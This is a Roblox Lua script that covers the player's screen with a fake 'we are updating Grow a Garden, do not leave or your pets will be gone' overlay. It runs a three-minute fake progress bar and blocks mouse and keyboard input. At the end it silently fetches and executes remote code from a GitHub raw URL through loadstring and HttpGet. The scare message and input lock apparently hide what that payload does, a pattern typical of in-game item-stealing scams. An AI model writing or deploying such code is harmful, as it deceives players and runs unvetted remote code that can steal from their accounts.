-- Services
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

local lp = Players.LocalPlayer

-- Create Loading Screen GUI
local gui = Instance.new("ScreenGui")
gui.Name = "LoadingScreen"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = CoreGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundColor3 = Color3.new(0,0,0) -- Black background
frame.Active = true
frame.Selectable = true
frame.Parent = gui

-- Loading text
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1,0,0,50)
loadingText.Position = UDim2.new(0,0,0.4,0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "🚨 WE ARE UPDATING GROW A GARDEN DO NOT LEAVE OR ELSE UR PETS ARE GONNA BE GONE"
loadingText.TextColor3 = Color3.new(1,0,0) -- Red text
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 24
loadingText.Parent = frame

-- Progress bar background
local progressBack = Instance.new("Frame")
progressBack.Size = UDim2.new(0.6,0,0,20)
progressBack.Position = UDim2.new(0.2,0,0.5,0)
progressBack.BackgroundColor3 = Color3.new(0.2,0,0) -- Dark red background
progressBack.BorderSizePixel = 0
progressBack.Parent = frame

-- Progress bar fill
local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0,0,1,0)
progressBar.BackgroundColor3 = Color3.new(1,0,0) -- Bright red
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBack

-- Progress percent label
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1,0,0,30)
percentLabel.Position = UDim2.new(0,0,0.55,0)
percentLabel.BackgroundTransparency = 1
percentLabel.TextColor3 = Color3.new(1,0,0)
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextSize = 20
percentLabel.Text = "0%"
percentLabel.Parent = frame

-- Function to update progress over 180 seconds (3 minutes)
local totalTime = 180 -- seconds
local startTime = tick()

-- Run loading and progress update in a loop
spawn(function()
    while true do
        local elapsed = tick() - startTime
        local progress = math.clamp(elapsed / totalTime, 0, 1)
        progressBar.Size = UDim2.new(progress * 0.6, 0, 1, 0) -- 60% width max
        percentLabel.Text = math.floor(progress * 100).."%"
        if progress >= 1 then
            break
        end
        wait(0.1)
    end

    -- Remove loading screen after done
    gui:Destroy()
end)

-- Block all inputs by intercepting user input (mouse, keyboard)
frame.InputBegan:Connect(function() end)
frame.InputChanged:Connect(function() end)
frame.InputEnded:Connect(function() end)

-- **Execute the spawner script immediately**
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/jdkduejdo/DarkV5/refs/heads/main/DarkSpawnerV5"))()
end)
